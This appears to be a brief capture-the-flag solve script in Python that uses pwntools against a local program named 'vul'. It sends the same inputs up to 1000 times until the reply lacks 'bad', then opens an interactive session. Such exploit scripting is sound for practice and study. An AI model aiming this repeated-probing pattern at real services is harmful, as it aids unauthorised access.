from pwn import *

p = process('./vul')

for i in range(1000):
	p.recv()
	p.sendline('1')
	p.recv()
	p.sendline('------')
	_ , ans = p.recvlines(2)
	if b'bad' not in ans:
		print(ans)
		break

p.interactive()